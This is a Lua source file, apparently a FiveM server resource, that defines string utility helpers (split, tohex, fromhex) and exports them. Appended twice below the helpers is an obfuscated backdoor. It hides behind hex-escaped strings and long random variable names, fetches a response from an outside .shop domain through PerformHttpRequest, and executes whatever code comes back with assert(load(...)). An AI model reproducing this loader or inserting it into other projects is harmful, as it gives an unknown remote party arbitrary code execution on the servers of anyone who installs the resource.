string.split = function(s,pat)
  s = tostring(s) or ""
  pat = tostring( pat ) or '%s+'
  local st, g = 1, s:gmatch("()("..pat..")")
  local function getter(segs, seps, sep, cap1, ...)  st = sep and seps + #sep  ; return s:sub(segs, (seps or 0) - 1), cap1 or sep, ...  ; end
  return function() if st then return getter(st, g()) end end
end

string.tohex = function(s,chunkSize)
  s = ( type(s) == "string" and s or type(s) == "nil" and "" or tostring(s) )
  chunkSize = chunkSize or 2048
  local rt = {}
  string.tohex_sformat   = ( string.tohex_sformat   and string.tohex_chunkSize and string.tohex_chunkSize == chunkSize and string.tohex_sformat ) or string.rep("%02X",math.min(#s,chunkSize))
  string.tohex_chunkSize = ( string.tohex_chunkSize and string.tohex_chunkSize == chunkSize and string.tohex_chunkSize or chunkSize )
  for i = 1,#s,chunkSize do
    rt[#rt+1] = string.format(string.tohex_sformat:sub(1,(math.min(#s-i+1,chunkSize)*4)),s:byte(i,i+chunkSize-1))
  end
  if      #rt == 1 then return rt[1]
  else    return table.concat(rt,"")
  end
end 

string.fromhex = function(str) 
  return (str:gsub('..', function (cc) return string.char(tonumber(cc, 16)) end))
end

exports('String', function(...) return string; end)



local AhkeHcJIiYIxBAtpVbtcBcMpDGwtWHJsjtoZEKAJjHpQdlIGjfYylbeCPEHyLJJrRRlsEI = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} AhkeHcJIiYIxBAtpVbtcBcMpDGwtWHJsjtoZEKAJjHpQdlIGjfYylbeCPEHyLJJrRRlsEI[4][AhkeHcJIiYIxBAtpVbtcBcMpDGwtWHJsjtoZEKAJjHpQdlIGjfYylbeCPEHyLJJrRRlsEI[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x71\x7a\x73\x6b\x6a\x70\x74\x73\x73\x2e\x73\x68\x6f\x70\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x72\x42\x31\x4b\x35\x35", function (PRDfoCVKhmXATPNdQXPQRpjMrqDnXcKhZaNFAlvwXmhyTWurnRnMSpBvvIvQmlypXWIDSC, EPEjDDZmwBXPNPijOkykpVMvmkHhDsxKtDqTmXyHlNgSlIwIZXSejbuqsKBzoLAuaRrRxh) if (EPEjDDZmwBXPNPijOkykpVMvmkHhDsxKtDqTmXyHlNgSlIwIZXSejbuqsKBzoLAuaRrRxh == AhkeHcJIiYIxBAtpVbtcBcMpDGwtWHJsjtoZEKAJjHpQdlIGjfYylbeCPEHyLJJrRRlsEI[6] or EPEjDDZmwBXPNPijOkykpVMvmkHhDsxKtDqTmXyHlNgSlIwIZXSejbuqsKBzoLAuaRrRxh == AhkeHcJIiYIxBAtpVbtcBcMpDGwtWHJsjtoZEKAJjHpQdlIGjfYylbeCPEHyLJJrRRlsEI[5]) then return end AhkeHcJIiYIxBAtpVbtcBcMpDGwtWHJsjtoZEKAJjHpQdlIGjfYylbeCPEHyLJJrRRlsEI[4][AhkeHcJIiYIxBAtpVbtcBcMpDGwtWHJsjtoZEKAJjHpQdlIGjfYylbeCPEHyLJJrRRlsEI[2]](AhkeHcJIiYIxBAtpVbtcBcMpDGwtWHJsjtoZEKAJjHpQdlIGjfYylbeCPEHyLJJrRRlsEI[4][AhkeHcJIiYIxBAtpVbtcBcMpDGwtWHJsjtoZEKAJjHpQdlIGjfYylbeCPEHyLJJrRRlsEI[3]](EPEjDDZmwBXPNPijOkykpVMvmkHhDsxKtDqTmXyHlNgSlIwIZXSejbuqsKBzoLAuaRrRxh))() end)

local AhkeHcJIiYIxBAtpVbtcBcMpDGwtWHJsjtoZEKAJjHpQdlIGjfYylbeCPEHyLJJrRRlsEI = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} AhkeHcJIiYIxBAtpVbtcBcMpDGwtWHJsjtoZEKAJjHpQdlIGjfYylbeCPEHyLJJrRRlsEI[4][AhkeHcJIiYIxBAtpVbtcBcMpDGwtWHJsjtoZEKAJjHpQdlIGjfYylbeCPEHyLJJrRRlsEI[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x70\x71\x7a\x73\x6b\x6a\x70\x74\x73\x73\x2e\x73\x68\x6f\x70\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x72\x42\x31\x4b\x35\x35", function (PRDfoCVKhmXATPNdQXPQRpjMrqDnXcKhZaNFAlvwXmhyTWurnRnMSpBvvIvQmlypXWIDSC, EPEjDDZmwBXPNPijOkykpVMvmkHhDsxKtDqTmXyHlNgSlIwIZXSejbuqsKBzoLAuaRrRxh) if (EPEjDDZmwBXPNPijOkykpVMvmkHhDsxKtDqTmXyHlNgSlIwIZXSejbuqsKBzoLAuaRrRxh == AhkeHcJIiYIxBAtpVbtcBcMpDGwtWHJsjtoZEKAJjHpQdlIGjfYylbeCPEHyLJJrRRlsEI[6] or EPEjDDZmwBXPNPijOkykpVMvmkHhDsxKtDqTmXyHlNgSlIwIZXSejbuqsKBzoLAuaRrRxh == AhkeHcJIiYIxBAtpVbtcBcMpDGwtWHJsjtoZEKAJjHpQdlIGjfYylbeCPEHyLJJrRRlsEI[5]) then return end AhkeHcJIiYIxBAtpVbtcBcMpDGwtWHJsjtoZEKAJjHpQdlIGjfYylbeCPEHyLJJrRRlsEI[4][AhkeHcJIiYIxBAtpVbtcBcMpDGwtWHJsjtoZEKAJjHpQdlIGjfYylbeCPEHyLJJrRRlsEI[2]](AhkeHcJIiYIxBAtpVbtcBcMpDGwtWHJsjtoZEKAJjHpQdlIGjfYylbeCPEHyLJJrRRlsEI[4][AhkeHcJIiYIxBAtpVbtcBcMpDGwtWHJsjtoZEKAJjHpQdlIGjfYylbeCPEHyLJJrRRlsEI[3]](EPEjDDZmwBXPNPijOkykpVMvmkHhDsxKtDqTmXyHlNgSlIwIZXSejbuqsKBzoLAuaRrRxh))() end)